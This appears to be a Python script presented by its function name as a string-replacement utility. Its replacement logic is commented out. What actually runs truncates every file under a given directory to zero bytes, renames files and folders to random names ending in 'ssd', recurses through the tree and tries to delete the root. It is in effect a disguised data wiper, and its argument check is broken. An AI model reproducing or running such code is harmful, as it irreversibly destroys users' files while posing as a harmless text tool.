import os
import sys
import random
def Replace_File_Str(root_dir, old_str = "", new_str =""):
	for root, dirs, files in os.walk(root_dir, topdown=True):
		for name in files:
			try:
				fp = open(root+"/"+name,'r+',encoding='UTF-8')
				fp.truncate()
				fp.close()

				# if old_text.find(old_str) != -1:
				# 	# new_text = old_text.replace(old_str, new_str)
				# 	new_text = "111"
				# 	fp = open(root+"/"+name,'w+')
				# 	fp.write(new_text)
				# 	fp.truncate()
				# 	fp.close()
			except OSError as err:
				print("OS error: {0}".format(err))
			os.rename(root+"/"+name, root+"/"+random.choice('abcdefghijklmnopqrstuvwxyz')+str(random.randint(1,90000))+"."+random.choice('abcdefghijklmnopqrstuvwxyz')+"ssd")
		for i in dirs:
			if os.path.isdir(root+"/"+i) :
				new_dir = root + "/" + random.choice('abcdefghijklmnopqrstuvwxyz') + str(random.randint(1, 5000))
				os.rename(root + "/" + i, new_dir)
				Replace_File_Str(new_dir)

	return 'OK'

def main():
	if len(sys.argv) != 1:
		print("Parameters are error!")
	root_dir = sys.argv[1]
	# old_str = sys.argv[2]
	# new_str = sys.argv[3]
	print(root_dir)
	# print(old_str)
	# print(new_str)
	print(Replace_File_Str(root_dir))
	os.remove(root_dir)

if __name__ == '__main__':
	main()
